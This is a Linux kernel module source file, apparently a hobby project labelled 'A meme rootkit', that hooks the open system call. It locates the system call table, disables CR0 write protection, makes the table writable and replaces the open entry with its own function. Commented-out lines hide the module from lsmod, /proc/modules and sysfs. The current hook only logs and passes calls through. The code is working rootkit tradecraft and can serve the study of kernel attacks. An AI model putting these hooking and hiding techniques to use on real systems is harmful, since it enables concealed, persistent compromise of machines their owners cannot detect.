#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h> 
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jason Turley");
MODULE_DESCRIPTION("A meme rootkit.");

static char *memefile;
static unsigned long **sys_call_table;

module_param(memefile, charp, 0);
MODULE_PARM_DESC(memefile, "file path to the meme.");

/*
 * Since Linux kernel version 5.0+, we can no longer edit the control register, cr0 with
 * the write_cr0 macro. However, we can use inline assembly to edit the register directly.
 *
 * credit: 
 *	- https://www.linkedin.com/pulse/changing-wp-bit-cr0-registerkernel-50-yash-kumar
 * 	- https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8dbec27a242cd3e2816eeb98d3237b9f57cf6232
 */
static inline void overwrite_cr0(unsigned long val)
{
	asm volatile ("mov %0, %%cr0": "+r" (val));
}

/*
 * Disables the Write Protected (read only) bit in the control register, cr0.
 * 
 * We need to disable it in order to overwrite to the system call table at
 * runtime.
 */
static void disable_write_protected_bit(void)
{
	preempt_disable();
	overwrite_cr0(read_cr0() & (~ 0x10000));
}

/*
 * Enables the Write Protected (read only) bit in the control register, cr0.
 *
 * We need to reenable it after our exploit/hijack is complete.
 */
static void enable_write_protected_bit(void)
{
	overwrite_cr0(read_cr0() | 0x10000);
	preempt_enable();
}

int set_addr_rw(unsigned long addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);

	if (pte == NULL)
		return -1;

	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW;

	return 0;
}

int set_addr_ro(unsigned long addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);

	if (pte == NULL) {
		return -1;
	}

	pte->pte = pte->pte &~_PAGE_RW;

	return 0;
}


/* Save a copy of the original open system call */
asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);

/* 
 * meme_open: the hijacked open system call that will open the memefile instead of
 * the intended PNG file. 
 */
asmlinkage int meme_open(const char *pathname, int flags, mode_t mode)
{
	/*
	size_t len = strlen(pathname);
	const char *extension;
	int fd;

	extension = pathname + len - 4;

	printk(KERN_DEBUG "extension = %s\n", extension);

	// if so, open our memefile instead
		// otherwise, open the non-PNG file
	*/
	printk(KERN_DEBUG "memekit: inside meme_open\n");
	return original_open(pathname, flags, mode);
}

static int __init memekit_init(void)
{
	/* Uncomment to hide our rootkit from /proc/modules, /sys/module, and lsmod */
	/* WARNING: rmmod won't be able to find and remove the rootkit */
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	printk(KERN_DEBUG "memekit: module loaded!\n");

	/* Get address of sys_call_table */

	sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");

	if (sys_call_table != NULL) {
		printk(KERN_DEBUG "memekit: found sys_call_table at address %lx\n", (unsigned long)sys_call_table);
	} else {
		printk(KERN_ERR "memekit: failed to find sys_call_table, aborting now\n");
		return -1;	/* do not load */
	}

	if (set_addr_rw((unsigned long) sys_call_table)) {
		printk(KERN_ERR "memekit: set_addr_rw failed for address %lx\n", (unsigned long) sys_call_table);
		return -1;
	}

	/* Disable write protect so we can overwrite the syscall table */
	disable_write_protected_bit();

	/* Hijack the legit open system call with our meme open function */
	original_open = (int(*)(const char *, int, mode_t))sys_call_table[__NR_open]; 
	sys_call_table[__NR_open] = (void *) meme_open;

	return 0;
}

static void __exit memekit_exit(void)
{
	sys_call_table[__NR_open] = (void *) original_open;

	if (set_addr_ro((unsigned long) sys_call_table)) {
		printk(KERN_ERR "memekit: set_addr_ro failed for address %lx\n", (unsigned long) sys_call_table);
	}

	/* Reenable the write protect bit */
	enable_write_protected_bit();

	printk(KERN_DEBUG "memekit: unloaded!\n");
}

module_init(memekit_init);
module_exit(memekit_exit);
